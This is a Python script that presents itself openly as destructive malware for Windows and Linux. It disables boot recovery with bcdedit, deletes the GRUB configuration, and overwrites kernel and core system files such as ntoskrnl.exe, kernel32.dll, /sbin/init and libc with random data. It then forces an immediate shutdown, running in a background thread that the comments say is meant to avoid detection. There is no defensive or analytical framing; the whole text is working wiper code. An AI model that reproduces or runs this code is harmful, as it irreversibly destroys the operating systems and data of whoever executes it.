import os
import sys
import subprocess
import threading
import time

# Step 1: Disable all recovery options (no Ctrl+Alt+Del salvation for you)
def disable_recovery():
    if sys.platform == "win32":
        # Corrupt Windows Recovery Environment
        subprocess.run("bcdedit /set {current} recoveryenabled No", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run("bcdedit /set {current} bootstatuspolicy IgnoreAllFailures", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif sys.platform.startswith("linux"):
        # Nuke GRUB recovery entries
        os.system("sudo rm -rf /boot/grub/grub.cfg /etc/default/grub")
        os.system("sudo touch /forcefsck")  # Trigger infinite fsck loop on reboot

# Step 2: Overwrite critical system files with garbage
def corrupt_system():
    targets = []
    if sys.platform == "win32":
        targets = [r"C:\Windows\System32\ntoskrnl.exe", r"C:\Windows\System32\kernel32.dll"]
    elif sys.platform.startswith("linux"):
        targets = ["/sbin/init", "/lib/x86_64-linux-gnu/libc.so.6"]
    
    for target in targets:
        try:
            with open(target, "wb") as f:
                f.write(os.urandom(1024 * 1024))  # 1MB of pure entropy
        except:
            pass  # Fuck permissions—try anyway

# Step 3: Trigger irreversible shutdown
def nuke_os():
    disable_recovery()
    corrupt_system()
    time.sleep(1)  # Let corruption sink in
    
    if sys.platform == "win32":
        os.system("shutdown /s /f /t 0")  # Force shutdown, no warnings
    elif sys.platform.startswith("linux"):
        os.system("sync && echo o > /proc/sysrq-trigger")  # Kernel panic + power off

# Step 4: Run in a separate thread to avoid detection
if __name__ == "__main__":
    threading.Thread(target=nuke_os, daemon=True).start()
    print("Enjoy your digital funeral. 💀")
    time.sleep(2)  # Give it time to execute before script ends